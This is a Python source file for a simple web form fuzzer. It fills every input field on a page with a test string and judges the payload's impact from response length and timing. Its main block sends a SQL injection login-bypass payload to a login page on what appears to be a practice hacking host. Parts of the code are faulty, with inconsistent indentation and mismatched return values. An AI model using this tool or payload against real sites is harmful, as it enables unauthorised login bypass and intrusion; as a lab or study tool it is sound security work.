import requests
from bs4 import BeautifulSoup
import logging

from fuzzer import get_odds_and_debug

logging.basicConfig(filename="logs/fuzzer.log", level=logging.DEBUG)
tester_logger = logging.getLogger("Tester")

# Disable annoying debug logs from requests module
logging.getLogger("urllib3").setLevel(logging.WARNING)

CHECK_LOADTIME_NUM = 10
time_to_load = 0.0
odds_file, debug_mode = get_odds_and_debug()

def get_input_fields(URL):
	"""
	This function gets URL and returns all the id/name of the input tags in this url
	:param: URL - The url to get the info from
	"""
	# Get the html page
	r = requests.get(URL)
	soup = BeautifulSoup(r.text, 'html.parser')

	# Check all the input tags
	fields = []
	for inpt in soup.find_all("input"):
	# Some sites uses the name of the tag to send the data instead of the id
		if "id" in inpt.attrs:
			fields.append(inpt["id"])
		elif "name" in inpt.attrs:
			fields.append(inpt["name"])
		elif inpt.attrs["type"].lower() == "submit":
			pass
		else:
			print("Can't handle this input tag:\n" + str(inpt))

	return fields

def check_method(html):
    """
    This method checks if the sending method of given html
    is POST or GET
    """
    soup = BeautifulSoup(html, 'html.parser')

    form_tag = soup.find_all("form")
    form_tag = form_tag[0]

	# Sends the response to the URL
    if "method" in form_tag.attrs and form_tag["method"].lower() == "post":
		# Use default - GET
        return "post"
    elif "method" in form_tag.attrs and form_tag["method"].lower() == "get":
        return "get"
    else:
        return form_tag["method"].lower()

def check_loadtime(URL):
	global time_to_load
	if time_to_load != 0.0:
		return time_to_load

	time_avg = 0.0
	for x in range(CHECK_LOADTIME_NUM):
		item, tmp = get_info(URL)
		time_avg += item
	time_to_load = time_avg / CHECK_LOADTIME_NUM
	return time_to_load

def get_info(URL, s="abudy"):
    """
    This function sends request to URL with the given s as a parameter
    The function returns the time for the response to arrive and line length of
    the html
    :param: URL - The url to send the data to.
    :param: s - string to check html for, if empty will use random value
    """
    # Get inputs ready to send
    inputs = get_input_fields(URL)
    data = {}

    for inpt in inputs:
        data[inpt] = s

    # Sends the response to the URL
    r = requests.get(URL)
    method = check_method(r.text)
    if method == "post":
        r = requests.post(URL, data=data)
    elif method == "get":
        r = requests.get(URL, data=data)
    else:
        print("Unknown method", method)
        return 0
    return r.elapsed.total_seconds(), len(r.text.split("\n"))


def payload_check(URL, payload):
	"""
    This is the proper wat to use this file.
    You give the funtion a url and a string, and the function checks
    whether or not the string has an impact on the site.
    return:
    error - to alert that the string is giving an error
    success - To alert that the string is working
    normal - to alert that there is no special impact on the site
    """
	normal_time, normal_length = get_info(URL)
	suspicious_time, suspicious_length = get_info(URL, payload)

	loadtime = check_loadtime(URL)
	print(loadtime)

	tester_logger.debug("Normal Time: {}, Normal Length: {}".format(normal_time, normal_length))
	tester_logger.debug("Suspicious Time: {}, Suspicious Length: {}".format(suspicious_time, suspicious_length))

	if normal_length != suspicious_length:
		return "error"
    # Check for ten times to get avarage load time

	if suspicious_time > 2 * time_to_load:
		return "success"

	return "normal"


if __name__ == '__main__':
	URL = "http://s130993-101229-fax.croto.hack.me/login.php"
	payload = "\' or 1=1 -- "
	print(payload_check(URL, payload))
